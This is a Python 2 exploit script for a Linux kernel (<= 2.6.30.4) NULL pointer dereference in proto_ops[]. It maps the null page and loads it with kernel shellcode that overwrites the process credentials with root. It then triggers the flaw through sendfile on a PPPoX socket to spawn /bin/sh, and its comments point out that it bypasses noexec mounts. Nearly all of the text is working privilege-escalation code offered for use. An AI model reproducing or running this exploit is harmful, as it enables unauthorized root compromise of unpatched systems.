# Linux <= 2.6.30.4 proto_ops[] NULL pointer dereference exploit.
# by huku <huku _at_ grhack _dot_ net>
#
# 1. Use this code if you have encountered a server that has 'noexec'
# partitions.
# 
# 2. This code uses the Python FFI API in order to call C functions
# directly in order to prepare the shellcodes and calculate the
# addresses of our buffers.
#
# 3. A python2C converter sounds like a neat idea ;-p
#
from ctypes import *

# Allocate heap space and copy the given data inside. Returns 
# the address of the heap allocation as a standard python string 
# representation. The result can be used in a python string that
# contains a shellcode.
def alloc_and_copy(data, len):
  libc = CDLL("libc.so.6")
  ptr = libc.calloc(len, 1)
  libc.bcopy(data, ptr, len)
  libc.printf("# Copied %d bytes at 0x%.8x\n", len, ptr)

  # Convert to little endian.
  ptr_str = \
    chr((ptr & 0x000000ff) >> 0)  + \
    chr((ptr & 0x0000ff00) >> 8)  + \
    chr((ptr & 0x00ff0000) >> 16) + \
    chr((ptr & 0xff000000) >> 24)
  return ptr_str

# Allocate the null page and copy the shellcode in it.
def alloc_null_page(pagesize, data, len):
  libc = CDLL("libc.so.6")
  
  ptr = libc.mmap(c_void_p(), pagesize, 0x07, 0x32, -1, 0)
  if ptr == 0xffffffff:
    print "# Cannot allocate the null page"
    quit()

  libc.bcopy(data, ptr, len)
  libc.printf("# Copied %d bytes of shellcode at 0x%.8x\n", len, ptr)
  return

# Leet hax0r banner :-p
print "Linux <= 2.6.30.4 proto_ops[] NULL pointer dereference exploit"
print "Using Python's FFI to bypass noexec! ;-)"
print ""

libc = CDLL("libc.so.6")

uid = libc.getuid()
gid = libc.getgid()
libc.setresuid(uid, uid, uid)
libc.setresgid(gid, gid, gid)
print "# Current uid=" + str(uid) + " and current gid=" + str(gid)

pagesize = libc.getpagesize()
print "# Reported page size is " + str(pagesize) + " bytes"

print "# Copying uid and gid in the heap"
puid = alloc_and_copy(pointer(c_ulong(uid)), 4)
pgid = alloc_and_copy(pointer(c_ulong(gid)), 4)

print "# Copying \"/bin/sh\" string in the heap"
sh = c_char_p("/bin/sh")
psh = alloc_and_copy(sh, libc.strlen(sh))

print "# Copying exit_code() in the heap"
exit_code = c_char_p(
  "\x31\xc0" + \
  "\xb0\x0b" + \
  "\xbb" + psh + \
  "\x31\xc9" + \
  "\x31\xd2" + \
  "\xcd\x80")
pexit_code = alloc_and_copy(exit_code, libc.strlen(exit_code))

print "# Copying exit_stack[] in the heap"
exit_stack = "\x00" * pagesize 
pexit_stack = alloc_and_copy(exit_stack, pagesize)

print "# Loading kernel_code() in the null page"
kernel_code = \
  "\x55" + \
  "\x89\xe5" + \
  "\x53" + \
  "\x83\xec\x10" + \
  "\x89\xe0" + \
  "\x25\x00\xe0\xff\xff" + \
  "\x8b\x00" + \
  "\x89\x45\xec" + \
  "\x8b\x45\xec" + \
  "\x89\x45\xf0" + \
  "\x8b\x45\xf0" + \
  "\x89\x45\xf4" + \
  "\xc7\x45\xf8\x00\x00\x00\x00" + \
  "\x81\x7d\xf8\xf2\x03\x00\x00" + \
  "\x0f\x8f\x33\x01\x00\x00" + \
  "\x8b\x45\xf4" + \
  "\x8b\x00" + \
  "\x3b\x05" + puid + \
  "\x0f\x85\x12\x01\x00\x00" + \
  "\x8b\x45\xf4" + \
  "\x83\xc0\x04" + \
  "\x8b\x00" + \
  "\x3b\x05" + puid + \
  "\x0f\x85\xfe\x00\x00\x00" + \
  "\x8b\x45\xf4" + \
  "\x83\xc0\x08" + \
  "\x8b\x00" + \
  "\x3b\x05" + puid + \
  "\x0f\x85\xea\x00\x00\x00" + \
  "\x8b\x45\xf4" + \
  "\x83\xc0\x0c" + \
  "\x8b\x00" + \
  "\x3b\x05" + puid + \
  "\x0f\x85\xd6\x00\x00\x00" + \
  "\x8b\x45\xf4" + \
  "\x83\xc0\x10" + \
  "\x8b\x00" + \
  "\x3b\x05" + pgid + \
  "\x0f\x85\xc2\x00\x00\x00" + \
  "\x8b\x45\xf4" + \
  "\x83\xc0\x14" + \
  "\x8b\x00" + \
  "\x3b\x05" + pgid + \
  "\x0f\x85\xae\x00\x00\x00" + \
  "\x8b\x45\xf4" + \
  "\x83\xc0\x18" + \
  "\x8b\x00" + \
  "\x3b\x05" + pgid + \
  "\x0f\x85\x9a\x00\x00\x00" + \
  "\x8b\x45\xf4" + \
  "\x83\xc0\x1c" + \
  "\x8b\x00" + \
  "\x3b\x05" + pgid + \
  "\x0f\x85\x86\x00\x00\x00" + \
  "\x8b\x5d\xf4" + \
  "\x8b\x4d\xf4" + \
  "\x83\xc1\x04" + \
  "\x8b\x55\xf4" + \
  "\x83\xc2\x08" + \
  "\x8b\x45\xf4" + \
  "\x83\xc0\x0c" + \
  "\xc7\x00\x00\x00\x00\x00" + \
  "\xc7\x02\x00\x00\x00\x00" + \
  "\xc7\x01\x00\x00\x00\x00" + \
  "\xc7\x03\x00\x00\x00\x00" + \
  "\x8b\x5d\xf4" + \
  "\x83\xc3\x10" + \
  "\x8b\x4d\xf4" + \
  "\x83\xc1\x14" + \
  "\x8b\x55\xf4" + \
  "\x83\xc2\x18" + \
  "\x8b\x45\xf4" + \
  "\x83\xc0\x1c" + \
  "\xc7\x00\x00\x00\x00\x00" + \
  "\xc7\x02\x00\x00\x00\x00" + \
  "\xc7\x01\x00\x00\x00\x00" + \
  "\xc7\x03\x00\x00\x00\x00" + \
  "\x8d\x45\xf4" + \
  "\x83\x00\x24" + \
  "\x8b\x4d\xf4" + \
  "\x8b\x55\xf4" + \
  "\x83\xc2\x04" + \
  "\x8b\x45\xf4" + \
  "\x83\xc0\x08" + \
  "\xc7\x00\xff\xff\xff\xff" + \
  "\xc7\x02\xff\xff\xff\xff" + \
  "\xc7\x01\xff\xff\xff\xff" + \
  "\xeb\x10" + \
  "\x8d\x45\xf4" + \
  "\x83\x00\x04" + \
  "\x8d\x45\xf8" + \
  "\xff\x00" + \
  "\xe9\xc0\xfe\xff\xff" + \
  "\xba" + pexit_stack + \
  "\xb8" + pexit_code + \
  "\xc7\x44\x24\x10\x7b\x00\x00" + \
  "\x00" + \
  "\x89\x54\x24\x0c" + \
  "\xc7\x44\x24\x08\x46\x02\x00" + \
  "\x00" + \
  "\xc7\x44\x24\x04\x73\x00\x00" + \
  "\x00" + \
  "\x89\x04\x24" + \
  "\xcf" + \
  "\x83\xc4\x10" + \
  "\x5b" + \
  "\xc9" + \
  "\xc3"                    
alloc_null_page(pagesize, kernel_code, len(kernel_code))


PF_PPPOX = 24
SOCK_DGRAM = 2
fd = libc.socket(PF_PPPOX, SOCK_DGRAM, 0)
if fd < 0: 
  libc.perror("socket")
  quit()

infd = libc.open("PAGE_SIZE", 0x0242, 0777)
libc.unlink("PAGE_SIZE")
if infd < 0:
  libc.perror("open")
  quit()

print "# If you don't get root you are an idiot"
libc.ftruncate(infd, pagesize)
libc.sendfile(fd, infd, c_void_p(), pagesize)

libc.close(fd)
libc.close(infd)
print "# Done"

